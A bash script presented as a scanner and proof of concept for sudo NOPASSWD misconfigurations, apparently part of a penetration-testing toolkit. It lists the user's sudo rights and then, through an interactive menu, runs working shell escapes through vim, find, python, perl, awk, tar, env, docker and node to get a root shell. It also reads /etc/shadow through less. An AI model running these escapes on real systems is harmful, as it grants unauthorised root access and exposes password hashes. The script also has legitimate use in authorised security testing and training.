#!/bin/bash
# Sudo NOPASSWD Misconfiguration — Scanner & PoC
# Authorized security testing / lab use only. See ../../../README.md for scope.
# Author: SentinelByte

set -euo pipefail

echo "=== Sudo NOPASSWD Privilege Escalation Check ==="

echo -e "\n[*] Checking your sudo permissions with: sudo -l"
sudo -l || true

if sudo -l 2>/dev/null | grep -qE '\(ALL(\s*:\s*ALL)?\)\s+ALL'; then
    echo -e "\n[!] Unrestricted sudo access detected: (ALL : ALL) ALL"
    echo "    You can run any command as root. Try: sudo bash"
    exit 0
fi

echo -e "\n[*] Parsing allowed commands..."
mapfile -t SUDO_COMMANDS < <(sudo -l 2>/dev/null | grep -Eo '/[a-zA-Z0-9./_-]+' | sort -u)

if [ "${#SUDO_COMMANDS[@]}" -eq 0 ]; then
    echo "[-] No specific sudo NOPASSWD commands detected or sudo -l failed."
    exit 1
fi

# GTFOBins-style shell-escape run functions, keyed by binary name. Using a
# case/function dispatch instead of `eval` on a string means the set of
# commands that can ever execute is fixed at review time, not assembled at
# runtime from data — the exact distinction that makes sudoers NOPASSWD
# rules exploitable in the first place.
run_exploit() {
    case "$1" in
        vim)     sudo vim -c ':!bash' ;;
        less)    sudo less /etc/shadow ;;
        find)    sudo find . -exec /bin/sh \; -quit ;;
        python)  sudo python -c 'import os; os.system("/bin/sh")' ;;
        python3) sudo python3 -c 'import os; os.system("/bin/sh")' ;;
        perl)    sudo perl -e 'exec "/bin/sh";' ;;
        bash)    sudo bash ;;
        awk)     sudo awk 'BEGIN {system("/bin/sh")}' ;;
        tar)     sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh ;;
        env)     sudo env /bin/sh ;;
        docker)  sudo docker run -it --rm --privileged --entrypoint /bin/sh alpine ;;
        node)    sudo node -e 'require("child_process").exec("/bin/sh")' ;;
        *)       echo "[-] No built-in exploit wired up for '$1'." ; return 1 ;;
    esac
}

KNOWN_BINARIES=(vim less find python python3 perl bash awk tar env docker node)

echo -e "\n[*] Searching for potentially exploitable commands:"
SELECTABLE_CMDS=()
for path in "${SUDO_COMMANDS[@]}"; do
    cmd=$(basename "$path")
    for known in "${KNOWN_BINARIES[@]}"; do
        if [[ "$cmd" == "$known" ]] && command -v "$cmd" &>/dev/null; then
            echo "  [+] $cmd is sudo-NOPASSWD and shell-escapable (see GTFOBins)"
            SELECTABLE_CMDS+=("$cmd")
        fi
    done
done

if [ "${#SELECTABLE_CMDS[@]}" -eq 0 ]; then
    echo "[-] No known exploitable binaries found in sudo list."
    echo "    You can still check manually for risky entries (editors, shells, etc)."
    exit 0
fi

echo -e "\n[*] Exploitable sudo commands available:"
for i in "${!SELECTABLE_CMDS[@]}"; do
    printf "  [%d] %s\n" $((i + 1)) "${SELECTABLE_CMDS[$i]}"
done

NUM_CMDS=${#SELECTABLE_CMDS[@]}
read -r -p $'\n[?] Enter the number of the command to run (1 to '"$NUM_CMDS"$', or q to quit): ' SELECTION

if [[ "$SELECTION" =~ ^[0-9]+$ ]] && (( SELECTION >= 1 && SELECTION <= NUM_CMDS )); then
    SELECTED_CMD="${SELECTABLE_CMDS[$((SELECTION - 1))]}"
    echo -e "\n[*] Running exploit for: $SELECTED_CMD"
    run_exploit "$SELECTED_CMD"
else
    echo "[-] Invalid choice. Exiting."
    exit 1
fi
